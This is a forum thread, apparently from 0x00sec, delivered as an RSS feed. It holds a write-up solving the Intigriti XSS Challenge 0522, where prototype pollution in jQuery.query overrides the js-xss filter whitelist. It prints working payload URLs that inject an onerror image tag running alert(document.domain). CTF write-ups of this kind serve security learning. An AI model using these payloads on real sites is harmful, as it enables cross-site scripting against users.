<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Intigriti XSS Challenge 0522 Writeup</title>
    <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592</link>
    <description># Intigriti XSS Challenge 0522
Challenge author: PiyushThePal
Link: https://challenge-0522.intigriti.io

## Reconnaissance
Let&#39;s start by getting an overview of the challenge. When we browse the website we see it&#39;s all static content and not much interesting is going on. The only parameter we control is the `?page=1` parameter in the URL.
```javascript
var pl = $.query.get(&#39;page&#39;);
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById(&quot;root&quot;).innerHTML = pages[&#39;4&#39;]+filterXSS(pages[pl]);
} else {
    document.location.search = &quot;?page=1&quot;
}
```

At first this code seems secure. The only interesting thing we can find is `filterXSS(pages[pl])`, we can assume we will have to try and insert XSS into `pages[pl]` and then we have to bypass the XSS filter.

Let&#39;s take a look at the pages array and see if we can insert HTML code somehow.

```javascript
var pages = {
    1: `HOME
      &lt;h5&gt;Pollution is consuming the world. It&#39;s killing all the plants and ruining nature, but we won&#39;t let that happen! Our products will help you save the planet and yourself by purifying air naturally.&lt;/h5&gt;`,
    2: `PRODUCTS
      &lt;br&gt;
    &lt;footer&gt;
        &lt;img src=&quot;https://miro.medium.com/max/1000/1*Cd9sLiby5ibLJAkixjCidw.jpeg&quot; width=&quot;150&quot; height=&quot;200&quot; alt=&quot;Snake Plant&quot;&gt;&lt;/img&gt;&lt;span&gt;Snake Plant&lt;/span&gt;
      &lt;/footer&gt;
      &lt;footer&gt;
        &lt;img src=&quot;https://miro.medium.com/max/1000/1*wlzwrBXYoDDkaAag_CT-AA.jpeg&quot; width=&quot;150&quot; height=&quot;200&quot; alt=&quot;Areca Palm&quot;&gt;&lt;/img&gt;&lt;span&gt;Areca Palm&lt;/span&gt;
      &lt;/footer&gt;
    &lt;footer&gt;
        &lt;img src=&quot;https://miro.medium.com/max/1000/1*qn_6G8NV4xg_J0luFbY47w.jpeg&quot; width=&quot;150&quot; height=&quot;200&quot; alt=&quot;Rubber Plant&quot;&gt;&lt;/img&gt;&lt;span&gt;Rubber Plant&lt;/span&gt;
        &lt;/footer&gt;`,
    3: `CONTACT
      &lt;br&gt;&lt;br&gt;
      &lt;b&gt;
        &lt;a href=&quot;https://www.facebook.com/intigriticom/&quot;&gt;&lt;img src=&quot;https://cdn-icons-png.flaticon.com/512/124/124010.png&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;Facebook&quot;&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href=&quot;https://www.linkedin.com/company/intigriti/&quot;&gt;&lt;img src=&quot;https://cdn-icons-png.flaticon.com/512/61/61109.png&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;LinkedIn&quot;&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href=&quot;https://twitter.com/intigriti&quot;&gt;&lt;img src=&quot;https://cdn-icons-png.flaticon.com/512/124/124021.png&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;Twitter&quot;&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href=&quot;https://www.instagram.com/hackwithintigriti/&quot;&gt;&lt;img src=&quot;https://cdn-icons-png.flaticon.com/512/174/174855.png&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;Instagram&quot;&gt;&lt;/img&gt;&lt;/a&gt;
      &lt;/b&gt;
      `,
    4: `
      &lt;div class=&quot;dropdown&quot;&gt;
        &lt;div id=&quot;myDropdown&quot; class=&quot;dropdown-content&quot;&gt;
          &lt;a href = &quot;?page=1&quot;&gt;Home&lt;/a&gt;
          &lt;a href = &quot;?page=2&quot;&gt;Products&lt;/a&gt;
          &lt;a href = &quot;?page=3&quot;&gt;Contact&lt;/a&gt;
        &lt;/div&gt;
      &lt;/div&gt;`
};
```
There is no way to insert content into this object so we&#39;re also kind of stuck here. However, it is worth noting that pages is an object, and not an array. Normally an array would&#39;ve been the better solution so the fact that an object is used is somewhat interesting, although not entirely out of the ordinary.

Now the high level code we&#39;ve seen has no obvious security issues, so it&#39;s time to take a look at the implementations.

```html
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    /**
 * jQuery.query - Query String Modification and Creation for jQuery
 * Written by Blair Mitchelmore (blair DOT mitchelmore AT gmail DOT com)
 * Licensed under the WTFPL (http://sam.zoy.org/wtfpl/).
 * Date: 2009/8/13
 *
 * @author Blair Mitchelmore
 * @version 2.2.3
 *
 **/
 (javascript code here)
 &lt;/script&gt;
```

|Library|Findings|
|-|-|
|XSS.js 0.3.3|This seems interesting, taking a look at the [version history](https://www.npmjs.com/package/xss?activeTab=versions) the package seems outdated and probably has been put in here for a reason. Doing some initial research we find 2 vulnerabilities: [ReDoS](https://snyk.io/test/npm/xss/0.3.3) and [Sanetization Bypass](https://www.sourceclear.com/vulnerability-database/security/cross-site-scripting-xss-due-to/javascript/sid-2309/).|
|jQuery 3.5.1|This version was released pretty recently, only 2 years ago. It&#39;s pretty normal to use long term stable releases but perhaps there is a vulnerability for this package. Taking a look at the [CVE database](https://www.cvedetails.com/vulnerability-list/vendor_id-6538/Jquery.html) there are multiple vulnerabilities. But when we take a look at what versions are affected, we can see a couple where jQuery was affected below versions 3.5.0, so we can&#39;t find anything about the version we&#39;re currently using.|
|jQuery.query 2.2.3|This [plugin](https://plugins.jquery.com/query-object/) seems quite outdated. Doing some reconnaissance we find out that the [SET function is vulnerable to prototype pollution](https://gist.github.com/bdimcheff/2975441?permalink_comment_id=3730184#gistcomment-3730184).|

## Finding the vulnerability
During our reconnaissance we found out that jQuery.query&#39;s SET function was vulnerable to prototype pollution. When we take a look at our code the SET function never gets called. However, this does indicate that there may be another prototype pollution vulnerability.

```javascript
var pl = $.query.get(&#39;page&#39;);
```

We call the get function of the library, whose code is pasted down below.
```javascript
GET: function(key) {
    if (!is(key)) return this.keys;
    var parsed = parse(key), base = parsed[0], tokens = parsed[1];
    var target = this.keys[base];
    while (target != null &amp;&amp; tokens.length != 0) {
      target = target[tokens.shift()];
    }
    return typeof target == &#39;number&#39; ? target : target || &quot;&quot;;
},
get: function(key) {
    var target = this.GET(key);
    if (is(target, Object))
      return jQuery.extend(true, {}, target);
    else if (is(target, Array))
      return target.slice(0);
    return target;
},
```

Let&#39;s start by analyzing this code. We see that the `get` function calls the `GET` function. When we take a look at what the `GET` function does, it&#39;s mostly just parsing all of the data. The next line of the `get` function calls `is(target, Object)`. The `is` function is as follows:

```javascript
var is = function(o, t) {
  return o != undefined &amp;&amp; o !== null &amp;&amp; (!!t ? o.constructor == t : true);
};
```
So all this code really does is check if the target is of type Object. So what is considered an object?
```javascript
is(4, Object) // false
is(&quot;hey&quot;, Object) // false
is([], Object) // false
is({}, Object) // true
is(new Object, Object) // true
```

Because the application is expecting a page number and not an object, I believe this could be a possible attack vector. Therefore let&#39;s investigate further and see if we can satisfy this condition.

So in order to do that, we somehow need to pass in an object through a GET request. If we google &quot;pass in object get parameter&quot; then we don&#39;t get a lot of relevant results. They talk mostly about how to do it through a serialized JSON object. We do not have any deserialization going on so this won&#39;t do.

So it&#39;s time to experiment a bit. I download the website locally and open up the source code to make some changes. I start by changing the `get` function and adding some console output;

```javascript
get: function(key) {
    var target = this.GET(key);
    console.dir(&quot;target&quot;, target); // added
    console.dir(&quot;isobject?&quot;, is(target, Object)); // added
    if (is(target, Object)) {
        console.dir(&quot;extends&quot;, jQuery.extend(true, {}, target)); // added
        return jQuery.extend(true, {}, target);
    } // we needed to add braces
    else if (is(target, Array))
        return target.slice(0);
    return target;
},
```

Now if we go to the website we can open the console and see the following output:
```
target &lt;empty string&gt;
isobject? false
target 1
isobject? false
```

Let&#39;s try passing in an array now. So let&#39;s go to `?page[]=1&amp;page[]=2` and see what we get.

```
target Array [ 1, 2 ]
isobject? false
target 1
isobject? false
```

So it seems like we got redirected because `pages[ [1,2] ]` is equals to `undefined`. Let&#39;s modify the code to remove the redirection.
```javascript
var pl = $.query.get(&#39;page&#39;);
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById(&quot;root&quot;).innerHTML = pages[&#39;4&#39;]+filterXSS(pages[pl]);
} else {
    //document.location.search = &quot;?page=1&quot; // removed
    console.log(&quot;Redirection blocked.&quot;) // added
}
```

Now what would happen if we passed in a dictionary instead of an array? Let&#39;s visit `?page[a]=1&amp;page[b][c]=2`

![](upload://2gz8cnG3pW6bGOQ9eadvngdgJAL.png)

We have successfully passed in an object and passed the condition. Now let&#39;s see if we can [pollute the prototype](https://learn.snyk.io/lessons/prototype-pollution/javascript/) by going to the following URL: `?page[__proto__][a]=1`

![](upload://s2Cyjip5pV9Kc5fg1gfsC3uzqdG.png)

We have succesfully polluted the prototype of all objects. ✨Vulnerability found!✨ So let&#39;s try doing some XSS and solving the challenge.

## Let&#39;s inject some content!
So our goal is to exploit the following piece of code with prototype pollution to insert any HTML code we may want:
`document.getElementById(&quot;root&quot;).innerHTML = pages[&#39;4&#39;]+filterXSS(pages[pl]);`

So let&#39;s try seeing what happens if we do the the following url:
`?page[__proto__][a]=I am vulnerable!&amp;page=a`

![](upload://2PVz6iLA3VyBO5Q7Izrzxdz3JUw.png)

## Bypassing the XSS filter

We have successfully injected a page in the pages&#39; prototype and then accessed it. However as `filterXSS` hints, there will be some XSS filtering. So let&#39;s just try injecting some HTML and seeing how it gets filtered.
`?page[__proto__][a]=&lt;img src%3Dx onerror%3D&quot;alert(document.domain)&quot;&gt;&amp;page=a`

![](upload://5HY1nXpQ5XIP8FiNSGZ3FqaKEPE.png)

Let&#39;s start by [beautifying](https://beautifier.io/) `xss.js` and inspecting the `FilterXSS` function.

```javascript
function FilterXSS(options) {
    options = shallowCopyObject(options || {});
    if (options.stripIgnoreTag) {
        if (options.onIgnoreTag) {
            console.error(&#39;Notes: cannot use these two options &quot;stripIgnoreTag&quot; and &quot;onIgnoreTag&quot; at the same time&#39;)
        }
        options.onIgnoreTag = DEFAULT.onIgnoreTagStripAll
    }
    options.whiteList = options.whiteList || DEFAULT.whiteList;
    options.onTag = options.onTag || DEFAULT.onTag;
    options.onTagAttr = options.onTagAttr || DEFAULT.onTagAttr;
    options.onIgnoreTag = options.onIgnoreTag || DEFAULT.onIgnoreTag;
    options.onIgnoreTagAttr = options.onIgnoreTagAttr || DEFAULT.onIgnoreTagAttr;
    options.safeAttrValue = options.safeAttrValue || DEFAULT.safeAttrValue;
    options.escapeHtml = options.escapeHtml || DEFAULT.escapeHtml;
    this.options = options;
    if (options.css === false) {
        this.cssFilter = false
    } else {
        options.css = options.css || {};
        this.cssFilter = new FilterCSS(options.css)
    }
}
```

So as we can see there are quite a few options which we can set through prototype pollution. What really piqued my interest is the whiteList property. Let&#39;s start by taking a look at what exactly it does.

```javascript
var retHtml = parseTag(html, function(sourcePosition, position, tag, html, isClosing) {
    var info = {
        sourcePosition: sourcePosition,
        position: position,
        isClosing: isClosing,
        isWhite: tag in whiteList // &lt;--------------- WHITELIST HERE
    };
    var ret = onTag(tag, html, info);
    if (!isNull(ret)) return ret;
    if (info.isWhite) {
        if (info.isClosing) {
            return &quot;&lt;/&quot; + tag + &quot;&gt;&quot;
        }
        var attrs = getAttrs(html);
        var whiteAttrList = whiteList[tag]; // &lt;----- WHITELIST HERE
        var attrsHtml = parseAttr(attrs.html, function(name, value) {
            var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
            var ret = onTagAttr(tag, name, value, isWhiteAttr);
            if (!isNull(ret)) return ret;
            if (isWhiteAttr) {
                value = safeAttrValue(tag, name, value, cssFilter);
                if (value) {
                    return name + &#39;=&quot;&#39; + value + &#39;&quot;&#39;
                } else {
                    return name
                }
            } else {
                var ret = onIgnoreTagAttr(tag, name, value, isWhiteAttr);
                if (!isNull(ret)) return ret;
                return
            }
        });
        var html = &quot;&lt;&quot; + tag;
        if (attrsHtml) html += &quot; &quot; + attrsHtml;
        if (attrs.closing) html += &quot; /&quot;;
        html += &quot;&gt;&quot;;
        return html
    } else {
        var ret = onIgnoreTag(tag, html, info);
        if (!isNull(ret)) return ret;
        return escapeHtml(html)
    }
}, escapeHtml);
```

So interestingly, the `img` tag does not get filtered, it seems like the default whitelist allows this tag to pass through the XSS filter. However we can inject any tag by adding it to the prototype.

`?page[__proto__][script]=1&amp;page[__proto__][a]=&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;page=a`

![](upload://lxqFXFvGfAniaVcwy949559ngnv.png)

However, scripts don&#39;t get execute if they&#39;re added with `.innerHTML` so we need to use a different tag. My goal is to inject the following piece of HTML code: `&lt;img src=x onerror=&quot;alert(document.domain)&quot;&gt;`, which will execute if it&#39;s added with `.innerHTML`. But as seen before, all tags get stripped, so let&#39;s figure out how to bypass the tag whitelist.

```javascript
// tag = &quot;img&quot;
var whiteAttrList = whiteList[tag];
var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
```

So at first this seems like a problem, because `Array.indexOf` does not check the prototype of an array. However, even though `whiteAttrList` is presumed to be an array, it does not necessarily need to be. We can turn it into a string, which functions a lot like an array, which is why `Array.indexOf(string, needle)` will also work.

So let&#39;s add `src` and `onerror` to the whitelist with the following parameter:
`?page[__proto__][whiteList][img]=srconerror`

So let&#39;s try the previous payload with the bypass prepended.

`?page[__proto__][whiteList][img]=srconerror&amp;page[__proto__][a]=&lt;img src%3Dx onerror%3D&quot;alert(document.domain)&quot;&gt;&amp;page=a`

✨Success!✨
![](upload://tsvqio3OHqm29tBGlekyygFQzZr.png)</description>
    
    <lastBuildDate>Fri, 03 Jun 2022 10:58:10 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/6</link>
        <pubDate>Sun, 02 Oct 2022 14:11:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-6</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
        <description><![CDATA[
            <p>Yup they’re usually really challenging but this one was quite a bit easier. This is the third time I’ve attempted to do one but you learn a lot from failing them and then reading up where you went wrong. I’ll try and post more writeups here but no promises, because those challenges are usually way beyond my level <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/5</link>
        <pubDate>Fri, 03 Jun 2022 10:58:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-5</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>Ah, I’m so happy to see an Intigriti challenge writeup here! It’s an awesome platform.<br>
I was never that advanced with XSS’, never managed to solve any of their challenges! Keep it up <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/4</link>
        <pubDate>Fri, 03 Jun 2022 09:22:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-4</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="c0wm1lk" data-post="1" data-topic="29592">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/c0wm1lk/40/7625_2.png" class="avatar"> c0wm1lk:</div>
<blockquote>
<p>So at first this seems like a problem, because <code>Array.indexOf</code> does not check the prototype of an array.</p>
</blockquote>
</aside>
<p>Correction, I incorrectly assumed <code>whiteList</code> was already set to the default whitelist. This is not the case and the <code>whiteList</code> can be overwritten with prototype injection and therefore it can be an array and doesn’t necessarily have to be a string.</p>
<p>Thanks to <a href="https://github.com/0xGodson/blogs/blob/master/_posts/2022-06-03-intigriti-may-chal.md" rel="noopener nofollow ugc">0xGodson</a> for this correction.</p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/3</link>
        <pubDate>Thu, 02 Jun 2022 22:44:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-3</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
        <description><![CDATA[
            <p>This is my first writeup I’ve ever wrote so any feedback would be greatly appreciated! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592/2</link>
        <pubDate>Thu, 02 Jun 2022 22:12:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-29592-2</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge 0522 Writeup</title>
        <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
        <description><![CDATA[
            <h1>
<a name="intigriti-xss-challenge-0522-1" class="anchor" href="https://0x00sec.org#intigriti-xss-challenge-0522-1"></a>Intigriti XSS Challenge 0522</h1>
<p>Challenge author: PiyushThePal<br>
Link: <a href="https://challenge-0522.intigriti.io" rel="noopener nofollow ugc">https://challenge-0522.intigriti.io</a></p>
<h2>
<a name="reconnaissance-2" class="anchor" href="https://0x00sec.org#reconnaissance-2"></a>Reconnaissance</h2>
<p>Let’s start by getting an overview of the challenge. When we browse the website we see it’s all static content and not much interesting is going on. The only parameter we control is the <code>?page=1</code> parameter in the URL.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
} else {
    document.location.search = "?page=1"
}
</code></pre>
<p>At first this code seems secure. The only interesting thing we can find is <code>filterXSS(pages[pl])</code>, we can assume we will have to try and insert XSS into <code>pages[pl]</code> and then we have to bypass the XSS filter.</p>
<p>Let’s take a look at the pages array and see if we can insert HTML code somehow.</p>
<pre><code class="lang-javascript">var pages = {
    1: `HOME
      &lt;h5&gt;Pollution is consuming the world. It's killing all the plants and ruining nature, but we won't let that happen! Our products will help you save the planet and yourself by purifying air naturally.&lt;/h5&gt;`,
    2: `PRODUCTS
      &lt;br&gt;
    &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*Cd9sLiby5ibLJAkixjCidw.jpeg" width="150" height="200" alt="Snake Plant"&gt;&lt;/img&gt;&lt;span&gt;Snake Plant&lt;/span&gt;
      &lt;/footer&gt;
      &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*wlzwrBXYoDDkaAag_CT-AA.jpeg" width="150" height="200" alt="Areca Palm"&gt;&lt;/img&gt;&lt;span&gt;Areca Palm&lt;/span&gt;
      &lt;/footer&gt;
    &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*qn_6G8NV4xg_J0luFbY47w.jpeg" width="150" height="200" alt="Rubber Plant"&gt;&lt;/img&gt;&lt;span&gt;Rubber Plant&lt;/span&gt;
        &lt;/footer&gt;`,
    3: `CONTACT
      &lt;br&gt;&lt;br&gt;
      &lt;b&gt;
        &lt;a href="https://www.facebook.com/intigriticom/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="50" height="50" alt="Facebook"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://www.linkedin.com/company/intigriti/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/61/61109.png" width="50" height="50" alt="LinkedIn"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://twitter.com/intigriti"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/124/124021.png" width="50" height="50" alt="Twitter"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://www.instagram.com/hackwithintigriti/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="50" height="50" alt="Instagram"&gt;&lt;/img&gt;&lt;/a&gt;
      &lt;/b&gt;
      `,
    4: `
      &lt;div class="dropdown"&gt;
        &lt;div id="myDropdown" class="dropdown-content"&gt;
          &lt;a href = "?page=1"&gt;Home&lt;/a&gt;
          &lt;a href = "?page=2"&gt;Products&lt;/a&gt;
          &lt;a href = "?page=3"&gt;Contact&lt;/a&gt;
        &lt;/div&gt;
      &lt;/div&gt;`
};
</code></pre>
<p>There is no way to insert content into this object so we’re also kind of stuck here. However, it is worth noting that pages is an object, and not an array. Normally an array would’ve been the better solution so the fact that an object is used is somewhat interesting, although not entirely out of the ordinary.</p>
<p>Now the high level code we’ve seen has no obvious security issues, so it’s time to take a look at the implementations.</p>
<pre data-code-wrap="html"><code class="lang-nohighlight">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"&gt;&lt;/script&gt;
&lt;script src="https://code.jquery.com/jquery-3.5.1.js"&gt;&lt;/script&gt;
&lt;script&gt;
    /**
 * jQuery.query - Query String Modification and Creation for jQuery
 * Written by Blair Mitchelmore (blair DOT mitchelmore AT gmail DOT com)
 * Licensed under the WTFPL (http://sam.zoy.org/wtfpl/).
 * Date: 2009/8/13
 *
 * @author Blair Mitchelmore
 * @version 2.2.3
 *
 **/
 (javascript code here)
 &lt;/script&gt;
</code></pre>
<div class="md-table">
<table>
<thead>
<tr>
<th>Library</th>
<th>Findings</th>
</tr>
</thead>
<tbody>
<tr>
<td>XSS.js 0.3.3</td>
<td>This seems interesting, taking a look at the <a href="https://www.npmjs.com/package/xss?activeTab=versions" rel="noopener nofollow ugc">version history</a> the package seems outdated and probably has been put in here for a reason. Doing some initial research we find 2 vulnerabilities: <a href="https://snyk.io/test/npm/xss/0.3.3" rel="noopener nofollow ugc">ReDoS</a> and <a href="https://www.sourceclear.com/vulnerability-database/security/cross-site-scripting-xss-due-to/javascript/sid-2309/" rel="noopener nofollow ugc">Sanetization Bypass</a>.</td>
</tr>
<tr>
<td>jQuery 3.5.1</td>
<td>This version was released pretty recently, only 2 years ago. It’s pretty normal to use long term stable releases but perhaps there is a vulnerability for this package. Taking a look at the <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-6538/Jquery.html" rel="noopener nofollow ugc">CVE database</a> there are multiple vulnerabilities. But when we take a look at what versions are affected, we can see a couple where jQuery was affected below versions 3.5.0, so we can’t find anything about the version we’re currently using.</td>
</tr>
<tr>
<td>jQuery.query 2.2.3</td>
<td>This <a href="https://plugins.jquery.com/query-object/" rel="noopener nofollow ugc">plugin</a> seems quite outdated. Doing some reconnaissance we find out that the <a href="https://gist.github.com/bdimcheff/2975441?permalink_comment_id=3730184#gistcomment-3730184" rel="noopener nofollow ugc">SET function is vulnerable to prototype pollution</a>.</td>
</tr>
</tbody>
</table>
</div><h2>
<a name="finding-the-vulnerability-3" class="anchor" href="https://0x00sec.org#finding-the-vulnerability-3"></a>Finding the vulnerability</h2>
<p>During our reconnaissance we found out that jQuery.query’s SET function was vulnerable to prototype pollution. When we take a look at our code the SET function never gets called. However, this does indicate that there may be another prototype pollution vulnerability.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
</code></pre>
<p>We call the get function of the library, whose code is pasted down below.</p>
<pre><code class="lang-javascript">GET: function(key) {
    if (!is(key)) return this.keys;
    var parsed = parse(key), base = parsed[0], tokens = parsed[1];
    var target = this.keys[base];
    while (target != null &amp;&amp; tokens.length != 0) {
      target = target[tokens.shift()];
    }
    return typeof target == 'number' ? target : target || "";
},
get: function(key) {
    var target = this.GET(key);
    if (is(target, Object))
      return jQuery.extend(true, {}, target);
    else if (is(target, Array))
      return target.slice(0);
    return target;
},
</code></pre>
<p>Let’s start by analyzing this code. We see that the <code>get</code> function calls the <code>GET</code> function. When we take a look at what the <code>GET</code> function does, it’s mostly just parsing all of the data. The next line of the <code>get</code> function calls <code>is(target, Object)</code>. The <code>is</code> function is as follows:</p>
<pre><code class="lang-javascript">var is = function(o, t) {
  return o != undefined &amp;&amp; o !== null &amp;&amp; (!!t ? o.constructor == t : true);
};
</code></pre>
<p>So all this code really does is check if the target is of type Object. So what is considered an object?</p>
<pre><code class="lang-javascript">is(4, Object) // false
is("hey", Object) // false
is([], Object) // false
is({}, Object) // true
is(new Object, Object) // true
</code></pre>
<p>Because the application is expecting a page number and not an object, I believe this could be a possible attack vector. Therefore let’s investigate further and see if we can satisfy this condition.</p>
<p>So in order to do that, we somehow need to pass in an object through a GET request. If we google “pass in object get parameter” then we don’t get a lot of relevant results. They talk mostly about how to do it through a serialized JSON object. We do not have any deserialization going on so this won’t do.</p>
<p>So it’s time to experiment a bit. I download the website locally and open up the source code to make some changes. I start by changing the <code>get</code> function and adding some console output;</p>
<pre><code class="lang-javascript">get: function(key) {
    var target = this.GET(key);
    console.dir("target", target); // added
    console.dir("isobject?", is(target, Object)); // added
    if (is(target, Object)) {
        console.dir("extends", jQuery.extend(true, {}, target)); // added
        return jQuery.extend(true, {}, target);
    } // we needed to add braces
    else if (is(target, Array))
        return target.slice(0);
    return target;
},
</code></pre>
<p>Now if we go to the website we can open the console and see the following output:</p>
<pre><code class="lang-auto">target &lt;empty string&gt;
isobject? false
target 1
isobject? false
</code></pre>
<p>Let’s try passing in an array now. So let’s go to <code>?page[]=1&amp;page[]=2</code> and see what we get.</p>
<pre><code class="lang-auto">target Array [ 1, 2 ]
isobject? false
target 1
isobject? false
</code></pre>
<p>So it seems like we got redirected because <code>pages[ [1,2] ]</code> is equals to <code>undefined</code>. Let’s modify the code to remove the redirection.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
} else {
    //document.location.search = "?page=1" // removed
    console.log("Redirection blocked.") // added
}
</code></pre>
<p>Now what would happen if we passed in a dictionary instead of an array? Let’s visit <code>?page[a]=1&amp;page[b][c]=2</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe3c228ccd3f9377c15e9ab24a54d1250dbd22b.png" alt="" data-base62-sha1="2gz8cnG3pW6bGOQ9eadvngdgJAL" width="306" height="170"></p>
<p>We have successfully passed in an object and passed the condition. Now let’s see if we can <a href="https://learn.snyk.io/lessons/prototype-pollution/javascript/" rel="noopener nofollow ugc">pollute the prototype</a> by going to the following URL: <code>?page[__proto__][a]=1</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/4/c488be0ca619d0465834c2282e415a4c558ffda0.png" alt="" data-base62-sha1="s2Cyjip5pV9Kc5fg1gfsC3uzqdG" width="386" height="171"></p>
<p>We have succesfully polluted the prototype of all objects. <img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20">Vulnerability found!<img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20"> So let’s try doing some XSS and solving the challenge.</p>
<h2>
<a name="lets-inject-some-content-4" class="anchor" href="https://0x00sec.org#lets-inject-some-content-4"></a>Let’s inject some content!</h2>
<p>So our goal is to exploit the following piece of code with prototype pollution to insert any HTML code we may want:<br>
<code>document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);</code></p>
<p>So let’s try seeing what happens if we do the the following url:<br>
<code>?page[__proto__][a]=I am vulnerable!&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/3/13e311cc801249520e309cf8eff2a31efdecca9c.png" alt="" data-base62-sha1="2PVz6iLA3VyBO5Q7Izrzxdz3JUw" width="546" height="273"></p>
<h2>
